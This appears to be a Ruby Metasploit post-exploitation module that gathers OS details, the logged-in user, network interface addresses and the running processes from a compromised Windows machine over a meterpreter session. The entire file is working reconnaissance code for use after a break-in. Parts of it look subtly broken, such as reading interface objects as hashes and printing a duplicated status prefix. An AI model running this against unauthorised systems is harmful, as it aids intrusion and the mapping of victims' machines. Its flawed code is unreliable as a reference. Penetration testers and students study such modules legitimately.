#!/usr/bin/env ruby

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Information Gathering',
      'Description'    => %q{
        Grabs basic stuff from a Windows machine you're connected to,
        like OS details, users, network info, and running programs.
      },
      'Author'         => ['Ahmed Belhaj', 'Xavier'],
      'License'        => MSF_LICENSE,
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter']
    ))

    register_options([
      OptInt.new('SESSION', [true, 'The session ID to run this on'])
    ])
  end

  def run
    sess = client  # this is our connection to the target
    print_status("[*] Getting info from #{sess.session_host}")

    # get OS version and machine name
    sysinfo = sess.sys.config.sysinfo
    print_line("[*] OS: #{sysinfo['OS']} (Build #{sysinfo['Build']}, #{sysinfo['Architecture']}-bit)")
    print_line("[*] PC Name: #{sysinfo['Computer']}")

    # find out who is logged in
    user = sess.sys.config.getuid
    print_line("[*] Logged in as: #{user}")

    # check network interfaces and show IPs
    print_status("[*] Looking at network settings:")
    sess.net.config.interfaces.each do |iface|
      name    = iface['name'] || iface['interface']  # grab name of interface
      ip      = iface['ip'] || iface['ipaddress']    # get its IP address
      netmask = iface['netmask']                     # get the subnet info
      print_line("[*] Interface: #{name}, IP: #{ip}, Netmask: #{netmask}")
    end

    # show what programs are currently running
    print_status("[*] Checking what’s running:")
    begin
      procs = sess.sys.process.processes
      procs.each do |p|
        print_line("[*] Process #{p['pid']} - #{p['name']}")
      end
    rescue
      print_error("[-] Couldn’t get process list")
    end

    print_status("[*] Done gathering info")
  end
end
